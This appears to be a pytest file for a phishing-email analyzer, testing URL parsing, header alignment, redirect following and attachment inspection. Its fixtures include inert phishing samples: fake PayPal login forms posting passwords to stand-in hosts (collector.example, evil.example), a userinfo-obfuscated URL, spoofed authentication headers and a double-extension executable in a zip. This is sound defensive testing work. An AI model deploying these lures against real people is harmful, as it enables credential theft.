import zipfile
from pathlib import Path

import requests

from email_analysis.domain_utils import registered_domain, same_registered_domain
from email_analysis.header_analyzer import analyze_headers
from email_analysis.landing_page_analyzer import analyze_landing_page
from email_analysis.safe_http import SafeHTTPResponse
from email_analysis.url_extractor import extract_urls
from report.report_generator import generate_report


def test_public_suffix_registered_domain_logic() -> None:
    assert registered_domain("login.paypal.co.uk") == "paypal.co.uk"
    assert registered_domain("tenant.github.io") == "tenant.github.io"
    assert same_registered_domain("a.example.co.uk", "b.example.co.uk")


def test_url_userinfo_obfuscation_uses_real_host() -> None:
    urls = extract_urls("Click https://paypal.com@evil.example/login/verify now")

    assert len(urls) == 1
    assert urls[0]["domain"] == "evil.example"
    assert urls[0]["registered_domain"] == "evil.example"
    assert urls[0]["has_userinfo"] is True
    assert urls[0]["url_risk_score"] >= 18


def test_url_extraction_stops_before_expensive_expansion(monkeypatch) -> None:
    from email_analysis import url_extractor

    expanded: list[str] = []
    monkeypatch.setattr(
        url_extractor,
        "_expand_url",
        lambda url: expanded.append(url) or url,
    )
    body = " ".join(f"https://bit.ly/{index}" for index in range(5))

    assert url_extractor.count_unique_urls(body) == 5
    urls = url_extractor.extract_urls(body, max_urls=2)

    assert len(urls) == 2
    assert len(expanded) == 2


def test_url_extractor_skips_malformed_url_without_stopping_analysis() -> None:
    urls = extract_urls(
        "https://valid.test/login and malformed http://[::1 and https://other.test/"
    )

    assert [item["url"] for item in urls] == [
        "https://other.test/",
        "https://valid.test/login",
    ]


def test_report_discloses_truncated_evidence() -> None:
    report = generate_report(
        email_data={},
        auth_results={},
        urls=[],
        attachments=[],
        risk={"score": 0, "verdict": "LOW"},
        vt_url_reports=[],
        vt_hash_reports=[],
        otx_reports=[],
        analysis_limits={
            "urls_truncated": True,
            "attachments_truncated": True,
            "max_urls": 50,
            "max_attachments": 25,
        },
    )

    assert "URL analysis limited to the first 50 indicators" in report
    assert "Attachment analysis limited to the first 25 attachments" in report


def test_auth_alignment_flags_spf_pass_mismatch() -> None:
    headers = [
        ("From", "PayPal Security <alerts@paypal.com>"),
        (
            "Authentication-Results",
            "mx.example; spf=pass smtp.mailfrom=evil.example; "
            "dkim=none; dmarc=none header.from=paypal.com",
        ),
        ("Received", "from evil.example (evil.example [203.0.113.10]) by mx.example"),
    ]

    result = analyze_headers(headers)

    finding_types = {f["type"] for f in result["alignment"]["findings"]}
    assert "spf_alignment_mismatch" in finding_types
    assert "no_aligned_authentication" in finding_types


def test_landing_page_detects_password_form_and_brand(monkeypatch) -> None:
    from email_analysis import landing_page_analyzer

    landing_page_analyzer._CACHE.clear()
    monkeypatch.setattr(landing_page_analyzer, "OFFLINE_MODE", False)

    monkeypatch.setattr(
        landing_page_analyzer,
        "fetch_url",
        lambda *_args, **_kwargs: SafeHTTPResponse(
            url="https://evil.example/login",
            status_code=200,
            headers={"content-type": "text/html"},
            body=(
                b"<html><title>PayPal secure login verify</title>"
                b"<form method='POST' action='https://collector.example/post'>"
                b"<input type='password' name='pw'></form></html>"
            ),
            history=(),
        ),
    )

    result = analyze_landing_page("https://evil.example/login")

    assert result["state"] == "suspicious"
    assert result["password_fields"] == 1
    assert "paypal" in result["brand_mentions"]
    assert result["risk_score"] >= 30


def test_url_extractor_expands_shortener_through_safe_fetch(monkeypatch) -> None:
    from email_analysis import url_extractor

    calls: list[tuple[str, dict]] = []
    url_extractor._EXPAND_CACHE.clear()
    monkeypatch.setattr(url_extractor, "OFFLINE_MODE", False)
    monkeypatch.setattr(
        requests,
        "head",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            AssertionError("direct requests.head is forbidden")
        ),
    )
    monkeypatch.setattr(
        requests,
        "get",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            AssertionError("direct requests.get is forbidden")
        ),
    )

    def fake_fetch(url: str, **kwargs) -> SafeHTTPResponse:
        calls.append((url, kwargs))
        return SafeHTTPResponse(
            url="https://public.test/login",
            status_code=200,
            headers={},
            body=b"",
            history=(url,),
        )

    monkeypatch.setattr(url_extractor, "fetch_url", fake_fetch, raising=False)

    result = extract_urls("Click https://bit.ly/demo")

    assert result[0]["expanded_url"] == "https://public.test/login"
    assert calls == [("https://bit.ly/demo", {"method": "HEAD", "max_bytes": 0})]


def test_url_intelligence_uses_safe_fetch_for_expansion_and_redirects(
    monkeypatch,
) -> None:
    from email_analysis import url_intelligence

    calls: list[tuple[str, dict]] = []
    url_intelligence._EXPAND_CACHE.clear()
    url_intelligence._REDIRECT_CACHE.clear()
    monkeypatch.setattr(url_intelligence, "OFFLINE_MODE", False)
    monkeypatch.setattr(
        requests,
        "head",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            AssertionError("direct requests.head is forbidden")
        ),
    )
    monkeypatch.setattr(
        requests,
        "get",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            AssertionError("direct requests.get is forbidden")
        ),
    )

    def fake_fetch(url: str, **kwargs) -> SafeHTTPResponse:
        calls.append((url, kwargs))
        return SafeHTTPResponse(
            url="https://public.test/login",
            status_code=200,
            headers={},
            body=b"",
            history=(url, "https://redirect.test/hop"),
        )

    monkeypatch.setattr(url_intelligence, "fetch_url", fake_fetch, raising=False)

    assert url_intelligence.expand_url("https://bit.ly/demo") == (
        "https://public.test/login"
    )
    result = url_intelligence.follow_redirect_chain("https://public.test/start")

    assert result["chain"] == [
        "https://public.test/start",
        "https://redirect.test/hop",
        "https://public.test/login",
    ]
    assert result["hops"] == 2
    assert result["final_url"] == "https://public.test/login"
    assert calls == [
        ("https://bit.ly/demo", {"method": "HEAD", "max_bytes": 0}),
        ("https://public.test/start", {"method": "HEAD", "max_bytes": 0}),
    ]


def test_redirect_intelligence_represents_malformed_url_safely() -> None:
    from email_analysis import url_intelligence

    url_intelligence._REDIRECT_CACHE.clear()
    result = url_intelligence.follow_redirect_chain("http://[::1")

    assert result["chain"] == ["http://[::1"]
    assert result["error"] == "invalid_url"


def test_url_consumers_keep_friendly_fallbacks_for_transport_failures(
    monkeypatch,
) -> None:
    from email_analysis import landing_page_analyzer, url_extractor, url_intelligence

    raw_error = "socket detail must not leak"

    def fail_fetch(*_args, **_kwargs):
        raise OSError(raw_error)

    for module in (url_extractor, url_intelligence, landing_page_analyzer):
        monkeypatch.setattr(module, "OFFLINE_MODE", False)
        monkeypatch.setattr(module, "fetch_url", fail_fetch, raising=False)
    monkeypatch.setattr(
        requests,
        "head",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            AssertionError("direct requests.head is forbidden")
        ),
    )
    monkeypatch.setattr(
        requests,
        "get",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            AssertionError("direct requests.get is forbidden")
        ),
    )
    url_extractor._EXPAND_CACHE.clear()
    url_intelligence._EXPAND_CACHE.clear()
    url_intelligence._REDIRECT_CACHE.clear()
    landing_page_analyzer._CACHE.clear()

    assert url_extractor._expand_url("https://bit.ly/failure") == (
        "https://bit.ly/failure"
    )
    assert url_intelligence.expand_url("https://tinyurl.com/failure") == (
        "https://tinyurl.com/failure"
    )
    redirect = url_intelligence.follow_redirect_chain("https://public.test/failure")
    landing = landing_page_analyzer.analyze_landing_page("https://public.test/failure")

    assert redirect["error"] == "Redirect analysis failed"
    assert raw_error not in redirect["error"]
    assert landing["state"] == "unavailable"
    assert landing["error"] == "Landing page analysis failed"
    assert raw_error not in landing["error"]


def test_heuristic_redirect_analysis_uses_safe_fetch_but_run_has_no_redirect_io(
    monkeypatch,
) -> None:
    from email_analysis import heuristic_analyzer

    calls: list[tuple[str, dict]] = []
    heuristic_analyzer._REDIRECT_CACHE.clear()
    monkeypatch.setattr(heuristic_analyzer, "OFFLINE_MODE", False)
    monkeypatch.setattr(
        requests,
        "get",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            AssertionError("direct requests.get is forbidden")
        ),
    )
    monkeypatch.setattr(
        requests,
        "head",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            AssertionError("direct requests.head is forbidden")
        ),
    )

    def fake_fetch(url: str, **kwargs) -> SafeHTTPResponse:
        calls.append((url, kwargs))
        return SafeHTTPResponse(
            url="https://public.test/final",
            status_code=200,
            headers={},
            body=b"",
            history=(url, "https://redirect.test/hop"),
        )

    monkeypatch.setattr(heuristic_analyzer, "fetch_url", fake_fetch, raising=False)

    redirect = heuristic_analyzer.check_redirect_chain("https://public.test/start")
    assert redirect["chain"] == [
        "https://public.test/start",
        "https://redirect.test/hop",
        "https://public.test/final",
    ]
    assert redirect["hops"] == 2
    assert redirect["final_url"] == "https://public.test/final"
    assert calls == [("https://public.test/start", {"method": "HEAD", "max_bytes": 0})]

    monkeypatch.setattr(
        heuristic_analyzer,
        "check_redirect_chains",
        lambda _urls: (_ for _ in ()).throw(
            AssertionError("run_heuristics duplicated redirect I/O")
        ),
    )
    result = heuristic_analyzer.run_heuristics([])
    assert result["redirect_chains"] == []


def test_attachment_deep_inspection_detects_archive_payload_and_html(
    tmp_path: Path,
) -> None:
    from email_analysis.attachment_analyzer import assess_attachment_risk

    zip_path = tmp_path / "payload.zip"
    with zipfile.ZipFile(zip_path, "w") as archive:
        archive.writestr("invoice.pdf.exe", b"MZ")

    html_path = tmp_path / "login.html"
    html_path.write_text(
        "<form method='POST' action='https://evil.example/post'>"
        "<input type='password'></form>",
        encoding="utf-8",
    )

    findings = assess_attachment_risk(
        [
            {
                "filename": "payload.zip",
                "content_type": "application/zip",
                "size_bytes": zip_path.stat().st_size,
                "sha256": "a" * 64,
                "saved_path": str(zip_path),
            },
            {
                "filename": "login.html",
                "content_type": "text/html",
                "size_bytes": html_path.stat().st_size,
                "sha256": "b" * 64,
                "saved_path": str(html_path),
            },
        ]
    )

    warnings = "\n".join(w for f in findings for w in f["warnings"])
    assert "Archive contains executable/script payload" in warnings
    assert "HTML attachment contains credential-harvesting indicators" in warnings


def test_zip_macro_project_detection(tmp_path: Path) -> None:
    from email_analysis.attachment_analyzer import assess_attachment_risk

    docm_path = tmp_path / "macro.docm"
    with zipfile.ZipFile(docm_path, "w") as archive:
        archive.writestr("word/vbaProject.bin", b"macro")

    findings = assess_attachment_risk(
        [
            {
                "filename": "macro.docm",
                "content_type": "application/vnd.ms-word.document.macroEnabled.12",
                "size_bytes": docm_path.stat().st_size,
                "sha256": "c" * 64,
                "saved_path": str(docm_path),
            }
        ]
    )

    assert findings[0]["category"] == "macro_document"
    assert any("VBA macro project" in w for w in findings[0]["warnings"])
